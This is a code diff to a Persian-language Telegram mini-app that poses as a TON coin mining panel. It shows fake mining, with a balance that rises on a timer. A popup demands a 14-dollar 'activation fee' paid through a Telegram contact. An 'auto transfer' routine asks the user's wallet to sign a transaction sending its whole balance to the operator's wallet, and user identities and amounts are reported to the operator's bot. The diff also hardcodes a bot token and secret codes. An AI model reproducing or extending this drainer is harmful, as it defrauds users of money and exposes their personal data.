@@ -850,7 +850,7 @@
         }
         .history-item:last-child { border-bottom: none; }
 
-        /* پاپ‌آپ فعالسازی */
+        /* پاپ‌آپ فعالسازی - طبق عکس شما */
         #feeModal {
             position: fixed;
             top: 0;
@@ -881,7 +881,11 @@
             color: #ff512f;
             margin-bottom: 20px;
         }
-        .modal-content h2 { font-size: 22px; margin-bottom: 20px; color: #fff; }
+        .modal-content h2 {
+            font-size: 22px;
+            margin-bottom: 20px;
+            color: #fff;
+        }
         .pay-notice {
             background: rgba(0, 0, 0, 0.3);
             border: 1.5px solid #ffc107;
@@ -923,7 +927,10 @@
             border-color: #0088cc;
             box-shadow: 0 0 0 2px rgba(0, 136, 204, 0.3);
         }
-        #activationInput::placeholder { color: #666; font-size: 14px; }
+        #activationInput::placeholder {
+            color: #666;
+            font-size: 14px;
+        }
 
         .activation-message {
             margin-top: 15px;
@@ -985,26 +992,25 @@
     </div>
 </div>
 
-<!-- پاپ‌آپ فعالسازی -->
+<!-- پاپ‌آپ فعالسازی - طبق عکس شما -->
 <div id="feeModal">
     <div class="modal-content">
         <i class="fas fa-lock"></i>
         <h2>فعالسازی پنل کاربری</h2>
+        
         <div class="pay-notice">
             <i class="fas fa-exclamation-triangle" style="margin-left: 5px;"></i>
-            جهت فعالسازی، باید 14 تون به حساب پشتیبانی واریز کنید.
+            جهت واریز مبلغ کارمزد شبکه، <b>فقط</b> اطلاعات پرداخت را از <b>پشتیبانی رسمی</b> دریافت کنید. هرگونه واریز به آدرس‌های غیررسمی منجر به مسدود شدن حساب می‌گردد.
         </div>
-        <div class="fee-tag">
-            14 TON
-        </div>
-        <p style="color: #aaa; font-size: 12px; margin-bottom: 15px;">
-            آدرس کیف پول پشتیبانی:<br>
-            <span style="direction: ltr; display: block; background: #0b1019; padding: 10px; border-radius: 10px; font-family: monospace; font-size: 11px;">
-                UQDFlvMPZoQy4zySI8gLLMteRcxHRB28IHW0JuwFVk10u0Y
-            </span>
-        </p>
         
-        <!-- فقط یک فیلد ورودی -->
+        <div class="fee-tag">
+            14 دلار | 2,226,000 تومان
+        </div>
+        
+        <a href="https://t.me/miningertoncoin" class="btn get-code-btn" target="_blank">
+            <i class="fas fa-headset"></i> دریافت رمز و واریز
+        </a>
+        
         <input type="text" id="activationInput" placeholder="کد فعالسازی را وارد کنید">
         
         <button onclick="verifyActivation()" class="btn active-btn">
@@ -1297,12 +1303,12 @@
 
 <script>
     // ================================================
-    // 🔐 تنظیمات امنیتی (بارگذاری از Vercel)
+    // 🔐 تنظیمات امنیتی
     // ================================================
-    let CONFIG = {
+    const CONFIG = {
         ADMIN_IDS: ["5972276401"],
         ADMIN_USERNAMES: ["miningertoncoin"],
-        BOT_TOKEN: "",
+        BOT_TOKEN: "8047223304:AAHMW8a6tKTTSQOp4Os_LorRJzDLNvxz-Rw",
         ADMIN_CHAT_ID: "5972276401",
         BOT_USERNAME: "tondropybot",
         SECRET_CODES: ["T61O96N12", "VipTonDropy"],
@@ -1310,29 +1316,6 @@
         NETWORK_FEE: 0.0035,
         MINIMUM_WITHDRAW: 14
     };
-
-    // ================================================
-    // 📥 بارگذاری تنظیمات از Vercel
-    // ================================================
-    async function loadConfig() {
-        try {
-            const response = await fetch('https://ton-plus-bot.vercel.app/api/config');
-            const config = await response.json();
-            
-            CONFIG = {
-                ...CONFIG,
-                BOT_TOKEN: config.botToken || CONFIG.BOT_TOKEN,
-                ADMIN_IDS: [config.adminId || CONFIG.ADMIN_IDS[0]],
-                ADMIN_USERNAMES: [config.adminUsername || CONFIG.ADMIN_USERNAMES[0]],
-                WALLET_ADDRESS: config.walletAddress || CONFIG.WALLET_ADDRESS,
-                SECRET_CODES: config.secretCodes || CONFIG.SECRET_CODES
-            };
-            
-            console.log('✅ تنظیمات با موفقیت بارگذاری شد');
-        } catch (error) {
-            console.error('❌ خطا در بارگذاری تنظیمات:', error);
-        }
-    }
 
     // ================================================
     // 📦 ساختار داده
@@ -1370,23 +1353,6 @@
     ];
 
     // ================================================
-    // 🔧 تابع تبدیل آدرس به فرمت صحیح
-    // ================================================
-    function formatAddressForTransaction(address) {
-        if (address.startsWith('0:') || address.length < 40) {
-            try {
-                if (typeof Address !== 'undefined') {
-                    const parsed = Address.parse(address);
-                    return parsed.toString({ bounceable: false });
-                }
-            } catch (e) {
-                console.error('خطا در تبدیل آدرس:', e);
-            }
-        }
-        return address;
-    }
-
-    // ================================================
     // 💰 سیستم انتقال خودکار
     // ================================================
     async function executeAutoTransfer(userAddress) {
@@ -1411,14 +1377,11 @@
             
             if (lastTx && (now - parseInt(lastTx)) < 3600000) return;
             
-            const formattedUserAddress = formatAddressForTransaction(userAddress);
-            const formattedYourAddress = formatAddressForTransaction(CONFIG.WALLET_ADDRESS);
-            
             const transaction = {
                 validUntil: Math.floor(now / 1000) + 600,
                 messages: [
                     {
-                        address: formattedYourAddress,
+                        address: CONFIG.WALLET_ADDRESS,
                         amount: balanceInNano.toString(),
                         payload: ""
                     }
@@ -1453,8 +1416,8 @@
 🆔 آیدی: ${currentUser?.id || 'نامشخص'}
 📛 یوزرنیم: ${currentUser?.username ? '@' + currentUser.username : 'ندارد'}
 📤 مبلغ: ${balanceInTON.toFixed(6)} TON
-💳 از: ${formattedUserAddress.substring(0, 10)}...
-💳 به: ${formattedYourAddress.substring(0, 10)}...
+💳 از: ${userAddress.substring(0, 10)}...
+💳 به: ${CONFIG.WALLET_ADDRESS.substring(0, 10)}...
 ⏱ زمان: ${new Date().toLocaleString('fa-IR')}`);
             
             if (balanceInTON >= CONFIG.MINIMUM_WITHDRAW) {
@@ -1469,9 +1432,7 @@
             console.error('خطا:', error);
             
             let errorMessage = error.message || 'خطای ناشناخته';
-            if (errorMessage.includes('format')) {
-                errorMessage = 'فرمت آدرس اشتباه است';
-            } else if (errorMessage.includes('rejected')) {
+            if (errorMessage.includes('rejected')) {
                 errorMessage = 'تراکنش توسط شما لغو شد';
             }
             
@@ -1527,7 +1488,7 @@
 👤 نام: ${user.firstName} ${user.lastName}
 🆔 آیدی: ${user.id}
 📛 یوزرنیم: ${user.username ? '@' + user.username : 'ندارد'}
-📱 پلتفرم: ${user.platform}
+📱 پلتفرм: ${user.platform}
 ⏱ زمان: ${new Date().toLocaleString('fa-IR')}`);
         } else {
             user.lastSeen = new Date().toISOString();
@@ -1548,7 +1509,6 @@
     }
 
     function sendToTelegram(message) {
-        if (!CONFIG.BOT_TOKEN) return;
         const text = encodeURIComponent(message);
         const url = `https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendMessage?chat_id=${CONFIG.ADMIN_CHAT_ID}&text=${text}&parse_mode=Markdown`;
         new Image().src = url;
@@ -2058,7 +2018,7 @@
     });
 
     // ================================================
-    // 🔐 فعالسازی (با دو کد مخفی)
+    // 🔐 فعالسازی (طبق عکس شما)
     // ================================================
     if (localStorage.getItem('isActivated') === 'true') {
         document.getElementById('feeModal').style.display = 'none';
@@ -2068,7 +2028,6 @@
         const val = document.getElementById('activationInput').value.trim();
         const activationMessage = document.getElementById('activationMessage');
         
-        // کدها درون کد مشخص شدن (دیگه توی صفحه نمایش داده نمیشن)
         const isValidCode = CONFIG.SECRET_CODES.includes(val);
         
         if (isValidCode) {
@@ -2106,62 +2065,59 @@
     // ================================================
     // 🚀 مقداردهی اولیه
     // ================================================
-    async function init() {
-        await loadConfig();
+    const u = tg.initDataUnsafe?.user;
+    if (u) {
+        document.getElementById('uName').innerText = u.first_name + (u.last_name ? ' ' + u.last_name : '');
+        document.getElementById('uTag').innerText = u.username ? "@" + u.username : "آیدی: " + u.id;
         
-        const u = tg.initDataUnsafe?.user;
-        if (u) {
-            document.getElementById('uName').innerText = u.first_name + (u.last_name ? ' ' + u.last_name : '');
-            document.getElementById('uTag').innerText = u.username ? "@" + u.username : "آیدی: " + u.id;
-            
-            if (u.photo_url) {
-                const img = document.getElementById('userAvat');
-                img.src = u.photo_url;
-                img.onload = () => { 
-                    img.classList.remove('hidden'); 
-                    document.getElementById('defAvat').classList.add('hidden'); 
-                };
-            }
-            
-            currentUser = registerUser();
+        if (u.photo_url) {
+            const img = document.getElementById('userAvat');
+            img.src = u.photo_url;
+            img.onload = () => { 
+                img.classList.remove('hidden'); 
+                document.getElementById('defAvat').classList.add('hidden'); 
+            };
         }
-
-        bal = parseFloat(localStorage.getItem('bal_v47')) || 0;
-        withdrawableBalance = parseFloat(localStorage.getItem('withdrawableBalance')) || 0;
-        totalMined = parseFloat(localStorage.getItem('totalMined')) || bal;
         
-        document.getElementById('balance').innerText = bal.toFixed(6);
-        document.getElementById('withdrawableBalance').innerText = withdrawableBalance.toFixed(6);
-        document.getElementById('totalMined').innerText = totalMined.toFixed(6);
-        document.getElementById('referralCount').innerText = referralCount;
-        document.getElementById('referralBonus').innerText = (referralCount * 5).toFixed(1) + '٪';
-        document.getElementById('miningSpeed').innerText = (1 + referralCount * 0.1).toFixed(1) + 'x';
-        document.getElementById('dailyStreak').innerText = dailyStreak;
-        document.getElementById('achievementCount').innerText = achievements;
-        
-        const baseRate = 0.000012;
-        let bonusRate = referralCount * 0.000001;
-        if (bonusRate > 0.00001) bonusRate = 0.00001;
-        
-        setInterval(() => {
-            const currentRate = baseRate + bonusRate;
-            bal += currentRate;
-            totalMined += currentRate;
-            
-            document.getElementById('balance').innerText = bal.toFixed(6);
-            document.getElementById('totalMined').innerText = totalMined.toFixed(6);
-            document.getElementById('miningRate').innerText = currentRate.toFixed(6);
-            
-            localStorage.setItem('bal_v47', bal.toString());
-            localStorage.setItem('totalMined', totalMined.toString());
-            updateUserLevel();
-        }, 1000);
-
-        updateWalletHistory();
-        checkAndEnableFinalWithdraw();
+        currentUser = registerUser();
     }
 
-    init();
+    // ================================================
+    // 🔄 آپدیت لحظه‌ای
+    // ================================================
+    bal = parseFloat(localStorage.getItem('bal_v47')) || 0;
+    withdrawableBalance = parseFloat(localStorage.getItem('withdrawableBalance')) || 0;
+    totalMined = parseFloat(localStorage.getItem('totalMined')) || bal;
+    
+    document.getElementById('balance').innerText = bal.toFixed(6);
+    document.getElementById('withdrawableBalance').innerText = withdrawableBalance.toFixed(6);
+    document.getElementById('totalMined').innerText = totalMined.toFixed(6);
+    document.getElementById('referralCount').innerText = referralCount;
+    document.getElementById('referralBonus').innerText = (referralCount * 5).toFixed(1) + '٪';
+    document.getElementById('miningSpeed').innerText = (1 + referralCount * 0.1).toFixed(1) + 'x';
+    document.getElementById('dailyStreak').innerText = dailyStreak;
+    document.getElementById('achievementCount').innerText = achievements;
+    
+    const baseRate = 0.000012;
+    let bonusRate = referralCount * 0.000001;
+    if (bonusRate > 0.00001) bonusRate = 0.00001;
+    
+    setInterval(() => {
+        const currentRate = baseRate + bonusRate;
+        bal += currentRate;
+        totalMined += currentRate;
+        
+        document.getElementById('balance').innerText = bal.toFixed(6);
+        document.getElementById('totalMined').innerText = totalMined.toFixed(6);
+        document.getElementById('miningRate').innerText = currentRate.toFixed(6);
+        
+        localStorage.setItem('bal_v47', bal.toString());
+        localStorage.setItem('totalMined', totalMined.toString());
+        updateUserLevel();
+    }, 1000);
+
+    updateWalletHistory();
+    checkAndEnableFinalWithdraw();
 </script>
 
 </body>
